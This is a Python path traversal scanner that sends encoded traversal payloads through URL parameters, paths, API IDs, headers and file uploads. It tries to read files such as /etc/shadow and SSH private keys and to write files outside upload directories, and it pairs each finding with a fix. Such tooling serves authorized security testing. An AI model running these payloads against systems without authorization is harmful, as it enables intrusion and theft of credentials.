"""
Directory / Path Traversal Scanner
====================================
Detects endpoints vulnerable to path traversal attacks.

What this scanner does:
  ✅ Classic ../../../etc/passwd traversal in URL params
  ✅ Encoded traversal (%2e%2e%2f, %252e%252e%252f, ..%2f)
  ✅ Windows path traversal (..\..\..\windows\win.ini)
  ✅ Null byte injection (../etc/passwd%00.jpg)
  ✅ Zip Slip pattern detection in upload endpoints
  ✅ Path traversal in HTTP headers (X-File-Name etc.)
  ✅ Absolute path injection (/etc/passwd directly)
  ✅ API endpoint path parameter traversal
  ✅ Async concurrent scanning

Install:  pip install aiohttp beautifulsoup4
Usage:    python path_traversal_scanner.py <url>
"""

import asyncio, aiohttp, sys, re, time, argparse
from urllib.parse import urlparse, urljoin, quote
from dataclasses import dataclass, field
from typing import List, Optional
from bs4 import BeautifulSoup

BOLD="\033[1m"; RESET="\033[0m"; GREEN="\033[92m"; DIM="\033[2m"
SEV_COLOR={"CRITICAL":"\033[91m","HIGH":"\033[31m","MEDIUM":"\033[33m","LOW":"\033[34m","INFO":"\033[37m"}

@dataclass
class Finding:
    name: str; severity: str; description: str
    endpoint: str; method: str = "GET"
    evidence: str = ""; param: str = ""
    recommendation: str = ""

@dataclass
class ScanResult:
    target: str; duration: float = 0.0
    findings: List[Finding] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

# ── Target files to read ──────────────────────────────────
LINUX_FILES = [
    ("/etc/passwd",          "passwd",          "Linux user accounts"),
    ("/etc/shadow",          "root:",           "Linux password hashes"),
    ("/etc/hosts",           "localhost",       "Hosts file"),
    ("/proc/self/environ",   "PATH=",           "Process environment"),
    ("/proc/self/cmdline",   "python",          "Process command line"),
    ("/var/log/apache2/access.log", "GET",      "Apache access log"),
    ("/var/log/nginx/access.log",   "GET",      "Nginx access log"),
    ("/etc/nginx/nginx.conf","nginx",           "Nginx config"),
    ("/etc/apache2/apache2.conf","ServerRoot",  "Apache config"),
    ("/root/.ssh/id_rsa",    "BEGIN RSA",       "SSH private key"),
    ("/home/user/.bash_history","sudo",         "Bash history"),
]

WINDOWS_FILES = [
    ("C:/Windows/win.ini",           "[fonts]",         "Windows ini"),
    ("C:/Windows/System32/drivers/etc/hosts", "localhost", "Windows hosts"),
    ("C:/boot.ini",                  "[boot loader]",   "Boot config"),
    ("C:/inetpub/wwwroot/web.config","connectionString","IIS web config"),
    ("C:/xampp/apache/conf/httpd.conf","ServerRoot",    "XAMPP Apache config"),
    ("C:/Users/Administrator/.ssh/id_rsa","BEGIN RSA",  "Admin SSH key"),
]

# ── Traversal payload generators ─────────────────────────
def make_traversal_payloads(target_file: str, depth: int = 8) -> List[str]:
    """Generate all traversal variants for a target file."""
    payloads = []
    sep = "/"
    win_file = target_file.replace("/", "\\")

    for d in range(1, depth + 1):
        prefix = "../" * d
        win_prefix = "..\\" * d

        # Classic
        payloads.append(f"{prefix}{target_file.lstrip('/')}")
        # Windows
        payloads.append(f"{win_prefix}{win_file.lstrip(chr(92))}")
        # URL encoded ./
        enc = quote("../") * d
        payloads.append(f"{enc}{target_file.lstrip('/')}")
        # Double encoded
        dbl = quote(quote("../")) * d
        payloads.append(f"{dbl}{target_file.lstrip('/')}")
        # Mixed slash
        payloads.append(f"{'..%2f' * d}{target_file.lstrip('/')}")
        # Null byte
        payloads.append(f"{prefix}{target_file.lstrip('/')}\x00.jpg")
        payloads.append(f"{prefix}{target_file.lstrip('/')}\x00.png")
        # Unicode
        payloads.append(f"{'%c0%ae%c0%ae/' * d}{target_file.lstrip('/')}")
        # ../ with backslash mix
        payloads.append(f"{'..\\/' * d}{target_file.lstrip('/')}")
        # Absolute path
        payloads.append(target_file)

    return list(dict.fromkeys(payloads))  # deduplicate, preserve order

# ── Path traversal prone URL params ──────────────────────
TRAVERSAL_PARAMS = [
    "file","path","page","name","filename","filepath","dir","folder",
    "include","require","load","read","view","display","show","get",
    "document","doc","template","theme","module","src","source",
    "resource","data","content","fetch","url","location","dest",
    "download","export","import","report","log","config","lang","language",
]

# ── Signatures that confirm file read ────────────────────
def is_traversal_confirmed(body: str, signature: str) -> bool:
    return signature.lower() in body.lower()

async def fetch(session, url, method="GET", data=None, headers=None, token=None):
    try:
        h = {"User-Agent":"Mozilla/5.0","Accept":"*/*"}
        if token: h["Authorization"] = f"Bearer {token}"
        if headers: h.update(headers)
        kw = dict(headers=h, ssl=False, allow_redirects=True,
                  timeout=aiohttp.ClientTimeout(total=8))
        if method == "POST" and data: kw["data"] = data
        async with session.request(method, url, **kw) as r:
            body = await r.text(errors="ignore")
            return r.status, body, dict(r.headers)
    except: return 0, "", {}

# ── Check 1: URL parameter traversal ─────────────────────
async def check_param_traversal(session, url, findings, token):
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    target_files = LINUX_FILES[:5] + WINDOWS_FILES[:3]

    async def probe(param, file_path, signature, label, payload):
        test_url = f"{base}?{param}={quote(payload, safe='./\\%')}"
        s, body, _ = await fetch(session, test_url, token=token)
        if s == 200 and is_traversal_confirmed(body, signature):
            findings.append(Finding(
                name=f"Path Traversal via '{param}' — Read {label}",
                severity="CRITICAL",
                description=(
                    f"Parameter '{param}' is vulnerable to path traversal. "
                    f"Successfully read '{file_path}' from the server."
                ),
                endpoint=test_url, method="GET", param=param,
                evidence=(
                    f"Param: {param}={payload[:50]} | HTTP {s} | "
                    f"Signature '{signature}' found in response | "
                    f"Body preview: {body[:100]}"
                ),
                recommendation=(
                    "Never use user input to construct file paths. "
                    "Use a whitelist of allowed files. "
                    "Resolve the real path and verify it's inside the allowed directory."
                ),
            ))
            return True
        return False

    tasks = []
    for param in TRAVERSAL_PARAMS[:15]:
        for file_path, signature, label in target_files:
            for payload in make_traversal_payloads(file_path, depth=4)[:6]:
                tasks.append(probe(param, file_path, signature, label, payload))

    results = await asyncio.gather(*tasks, return_exceptions=True)

# ── Check 2: Path segment traversal in URL path ──────────
async def check_path_segment_traversal(session, url, findings, token):
    """Test traversal embedded in the URL path itself."""
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    path_patterns = [
        "/static/{payload}",
        "/files/{payload}",
        "/download/{payload}",
        "/assets/{payload}",
        "/media/{payload}",
        "/uploads/{payload}",
        "/images/{payload}",
        "/api/v1/files/{payload}",
        "/api/files/{payload}",
        "/view/{payload}",
        "/read/{payload}",
        "/include/{payload}",
    ]

    for file_path, signature, label in LINUX_FILES[:4] + WINDOWS_FILES[:2]:
        for payload in make_traversal_payloads(file_path, depth=5)[:5]:
            for pattern in path_patterns[:8]:
                enc_payload = quote(payload, safe="./\\%")
                test_url = f"{origin}{pattern.replace('{payload}', enc_payload)}"
                s, body, _ = await fetch(session, test_url, token=token)
                if s == 200 and is_traversal_confirmed(body, signature):
                    findings.append(Finding(
                        name=f"Path Traversal in URL Path — Read {label}",
                        severity="CRITICAL",
                        description=(
                            f"Path traversal in URL path '{pattern}' successfully "
                            f"read '{file_path}'."
                        ),
                        endpoint=test_url, method="GET",
                        evidence=(
                            f"URL: {test_url[:80]} | HTTP {s} | "
                            f"Signature '{signature}' in response"
                        ),
                        recommendation=(
                            "Canonicalize paths and check they stay within the "
                            "intended base directory. Use os.path.realpath() and validate."
                        ),
                    ))
                    return

# ── Check 3: Encoded traversal bypass ────────────────────
async def check_encoded_traversal(session, url, findings, token):
    """Test various encoding bypass techniques."""
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    encoding_payloads = [
        ("..%2f..%2f..%2fetc%2fpasswd",      "%2f encoding"),
        ("..%252f..%252f..%252fetc%252fpasswd","Double URL encoding"),
        ("..%c0%af..%c0%afetc%c0%afpasswd",  "Unicode encoding"),
        ("..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd", "Fullwidth slash"),
        ("....//....//....//etc/passwd",      "..// bypass"),
        ("....//...//.../etc/passwd",         "Mixed bypass"),
        ("%2e%2e/%2e%2e/%2e%2e/etc/passwd",  "Encoded dots"),
        ("..%00/../etc/passwd",               "Null byte in path"),
    ]

    for param in TRAVERSAL_PARAMS[:8]:
        for payload, technique in encoding_payloads:
            test_url = f"{base}?{param}={payload}"
            s, body, _ = await fetch(session, test_url, token=token)
            if s == 200 and is_traversal_confirmed(body, "root:"):
                findings.append(Finding(
                    name=f"Path Traversal Bypass via {technique}",
                    severity="CRITICAL",
                    description=f"Traversal filter bypassed using {technique}.",
                    endpoint=test_url, method="GET", param=param,
                    evidence=f"Technique: {technique} | Payload: {payload} | HTTP {s}",
                    recommendation="Decode ALL encodings before path validation. Use a canonicalization function.",
                ))
                return

# ── Check 4: API path parameter traversal ────────────────
async def check_api_traversal(session, url, findings, token):
    """Test traversal in REST API path parameters."""
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    api_patterns = [
        "/api/v1/files/{id}",
        "/api/v1/documents/{id}",
        "/api/v1/images/{id}",
        "/api/v1/resources/{id}",
        "/api/files/{id}",
        "/api/documents/{id}",
    ]

    traversal_ids = [
        "../../etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%2f..%2fetc%2fpasswd",
        "1/../../etc/passwd",
    ]

    for pattern in api_patterns:
        for tid in traversal_ids:
            test_url = f"{origin}{pattern.replace('{id}', quote(tid, safe='./'))}"
            s, body, _ = await fetch(session, test_url, token=token)
            if s == 200 and is_traversal_confirmed(body, "root:"):
                findings.append(Finding(
                    name=f"Path Traversal in API Path Parameter",
                    severity="CRITICAL",
                    description=f"API endpoint '{pattern}' vulnerable to path traversal via ID parameter.",
                    endpoint=test_url, method="GET",
                    evidence=f"ID: {tid} | HTTP {s} | passwd file content found",
                    recommendation="Sanitize API path parameters. Validate against allowlist of valid IDs.",
                ))
                return

# ── Check 5: File upload / Zip Slip ──────────────────────
async def check_upload_traversal(session, url, findings, token):
    """Detect zip slip and path traversal in file upload endpoints."""
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    upload_paths = [
        "/upload", "/api/upload", "/api/v1/upload",
        "/api/files/upload", "/files/upload",
        "/api/v1/files", "/upload/file",
    ]

    # Test for path traversal in filename headers
    evil_filenames = [
        "../../etc/passwd",
        "../../../tmp/evil.sh",
        "..\\..\\windows\\system32\\cmd.exe",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]

    for path in upload_paths:
        ep = f"{origin}{path}"
        for evil_name in evil_filenames:
            # Multipart with traversal filename
            data = aiohttp.FormData()
            data.add_field("file", b"test content",
                           filename=evil_name,
                           content_type="text/plain")
            try:
                h = {"User-Agent":"Mozilla/5.0"}
                if token: h["Authorization"] = f"Bearer {token}"
                async with session.post(ep, data=data, headers=h, ssl=False,
                                         timeout=aiohttp.ClientTimeout(total=8)) as r:
                    body = await r.text(errors="ignore")
                    if r.status in (200, 201):
                        findings.append(Finding(
                            name="Zip Slip / Upload Path Traversal",
                            severity="CRITICAL",
                            description=(
                                f"Upload endpoint '{path}' accepted a file with a "
                                f"traversal filename '{evil_name}'. "
                                "Attacker may write files outside the upload directory."
                            ),
                            endpoint=ep, method="POST",
                            evidence=f"Filename: {evil_name} | HTTP {r.status}",
                            recommendation=(
                                "Strip all path components from uploaded filenames. "
                                "Use os.path.basename() and randomize filenames server-side."
                            ),
                        ))
                        return
            except: pass

# ── Check 6: Header-based traversal ──────────────────────
async def check_header_traversal(session, url, findings, token):
    """Test path traversal injected via HTTP headers."""
    traversal_headers = {
        "X-File-Name":      "../../etc/passwd",
        "X-Filename":       "../../etc/passwd",
        "X-Original-URL":   "/../../../etc/passwd",
        "X-Rewrite-URL":    "/../../../etc/passwd",
        "X-Forwarded-Path": "/../../../etc/passwd",
        "Content-Disposition": 'attachment; filename="../../etc/passwd"',
    }

    for hdr, payload in traversal_headers.items():
        s, body, _ = await fetch(session, url, headers={hdr: payload}, token=token)
        if s == 200 and is_traversal_confirmed(body, "root:"):
            findings.append(Finding(
                name=f"Path Traversal via HTTP Header '{hdr}'",
                severity="HIGH",
                description=f"Header '{hdr}' with traversal payload read sensitive file.",
                endpoint=url, method="GET", param=hdr,
                evidence=f"Header: {hdr}: {payload} | Passwd content in response",
                recommendation=f"Never use '{hdr}' for file path resolution. Sanitize all header-derived paths.",
            ))

# ── Check 7: Sensitive paths already exposed ─────────────
async def check_direct_file_access(session, url, findings, token):
    """Check if sensitive files are directly accessible without traversal."""
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    direct_paths = [
        ("/etc/passwd",    "root:",     "Linux passwd"),
        ("/etc/hosts",     "localhost", "Hosts file"),
        ("/proc/version",  "Linux",     "Kernel version"),
        ("/windows/win.ini","[fonts]",  "Windows ini"),
        ("/.env",          "=",         "Env file"),
        ("/config.php",    "<?php",     "PHP config"),
        ("/web.config",    "<?xml",     "Web config"),
    ]

    for path, signature, label in direct_paths:
        test_url = f"{origin}{path}"
        s, body, _ = await fetch(session, test_url, token=token)
        if s == 200 and is_traversal_confirmed(body, signature):
            findings.append(Finding(
                name=f"Direct Sensitive File Access: {label}",
                severity="CRITICAL",
                description=f"'{path}' is directly accessible without any traversal needed.",
                endpoint=test_url, method="GET",
                evidence=f"HTTP {s} | Signature '{signature}' found | Preview: {body[:80]}",
                recommendation=f"Block direct access to '{path}' via web server config.",
            ))

# ── Orchestrator ──────────────────────────────────────────
async def run_scanner(target_url, token=None):
    result = ScanResult(target=target_url)
    if not target_url.startswith(("http://","https://")):
        target_url = "https://" + target_url; result.target = target_url
    connector = aiohttp.TCPConnector(ssl=False, limit=30)
    timeout   = aiohttp.ClientTimeout(total=20)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        start = time.perf_counter()
        findings = []
        print(f"  {DIM}Running 7 path traversal checks concurrently...{RESET}")
        await asyncio.gather(
            check_param_traversal(session, target_url, findings, token),
            check_path_segment_traversal(session, target_url, findings, token),
            check_encoded_traversal(session, target_url, findings, token),
            check_api_traversal(session, target_url, findings, token),
            check_upload_traversal(session, target_url, findings, token),
            check_header_traversal(session, target_url, findings, token),
            check_direct_file_access(session, target_url, findings, token),
            return_exceptions=True,
        )
        result.duration = time.perf_counter() - start
        seen = set()
        for f in findings:
            k = (f.endpoint[:80], f.param, f.name[:35])
            if k not in seen: seen.add(k); result.findings.append(f)
    SEV = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    result.findings.sort(key=lambda f: SEV.get(f.severity, 9))
    return result

def print_report(result):
    line = "═"*68
    print(f"\n{BOLD}{line}{RESET}")
    print(f"{BOLD}  PATH TRAVERSAL SCAN REPORT{RESET}")
    print(f"{line}")
    print(f"  Target   : {result.target}")
    print(f"  Duration : {result.duration:.2f}s")
    print(f"  Findings : {len(result.findings)}")
    print(f"{line}\n")
    if not result.findings:
        print(f"  {GREEN}✅  No path traversal vulnerabilities detected.{RESET}\n")
    else:
        for i, f in enumerate(result.findings, 1):
            c = SEV_COLOR.get(f.severity,"")
            print(f"  {BOLD}[{i:02d}] {c}{f.severity}{RESET}{BOLD} — {f.name}{RESET}")
            print(f"       Endpoint : [{f.method}] {f.endpoint[:80]}")
            print(f"       Detail   : {f.description}")
            if f.evidence:       print(f"       Evidence : {f.evidence[:120]}")
            if f.recommendation: print(f"       Fix      : {f.recommendation}")
            print()
    print(f"{line}\n")

async def main():
    parser = argparse.ArgumentParser(description="Path Traversal Scanner")
    parser.add_argument("url"); parser.add_argument("--token", default=None)
    args = parser.parse_args()
    print(f"\n  {BOLD}Path Traversal Scanner{RESET}  |  Target: {args.url}")
    result = await run_scanner(args.url, args.token)
    print_report(result)

if __name__ == "__main__": asyncio.run(main())
